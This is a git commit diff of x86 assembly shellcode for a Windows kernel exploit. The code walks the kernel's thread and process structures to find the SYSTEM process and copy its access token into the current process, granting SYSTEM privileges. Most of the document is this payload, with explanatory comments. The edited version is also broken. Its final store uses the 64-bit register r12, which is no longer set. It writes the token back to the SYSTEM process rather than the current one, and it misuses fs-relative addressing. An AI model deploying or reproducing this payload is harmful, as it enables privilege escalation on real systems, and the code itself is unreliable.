a1107eadd6a371bb0a05ee577aeabc3f09944f63
Mohammed Hadi <57273771+HadiMed@users.noreply.github.com>
2021-11-09 08:41:53 +0100

    Update token_stealing.asm

--- win32/token_stealing.asm
+++ win32/token_stealing.asm
@@ -8,8 +8,8 @@ _start :
   ;This structure contains information about the processor such as current running thread, next thread to run, type, model, speed, etc. Both these structures are undocumented.
 
   pushad ; Save processsor state 
-  xor r11 , r11
-  mov r11 , fs:[r11+0x124] ;  move the _KPCR.PcrbData.CurrentThread into eax
+  xor eax , eax
+  mov eax , fs:[eax+0x124] ;  move the _KPCR.PcrbData.CurrentThread into eax
   
   ;PrcData’ _KPRCB structure we can find at offset 0x4 ‘CurrentThread’ which is of _KTHREAD (Kernel Thread) structure. This structure is embedded inside the ETHREAD structure.
   ;The ETHREAD structure is used by the Windows kernel to represent every thread in the system. This is represented by [FS:0x124].
@@ -20,19 +20,19 @@ _start :
   ;If explore further more on _KAPC_STATE structure we can find a pointer to the current process structure at offset 0x10, ‘Process’ which is of _KPROCESS structure. 
   ;The KPROCESS structure is embedded inside the EPROCESS structure and it contains scheduling related information like threads, quantum, priority and execution times. This is done in the shellcode as
   
-  mov r12 , fs:[r11+0x50]
-  
+  mov eax , fs:[eax+0x50]
+  mov ecx , eax
   ; find system process steal token 
   
   blah:
   ; traverse the double linked list and find the process ID of 0x4.
-    mov r12, [r12 + 0x0B8] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
-	  sub r12, 0x0B8
-	  cmp [r12 + 0x0B4], 0x4 ; Get nt!_EPROCESS.UniqueProcessId
-	  jne blah
+    mov eax, [eax + 0x0B8] ; Get nt!_EPROCESS.ActiveProcessLinks.Flink
+    sub eax, 0x0B8
+    cmp [eax + 0x0B4], 0x4 ; Get nt!_EPROCESS.UniqueProcessId
+    jne blah
 
   ;Once we find the ‘System’ process we replace our current process’s token with the token value of the ‘System’ process. The offset of ‘Token’ is at 0xf8
-  mov r12, [r12 + 0x0F8] ; Get SYSTEM process nt!_EPROCESS.Token  
-  mov [r11 + 0x0F8], r12 ; Replace our current token to SYSTEM
+  mov eax, [eax + 0x0F8] ; Get SYSTEM process nt!_EPROCESS.Token  
+  mov [eax + 0x0F8], r12 ; Replace our current token to SYSTEM
   popad
    
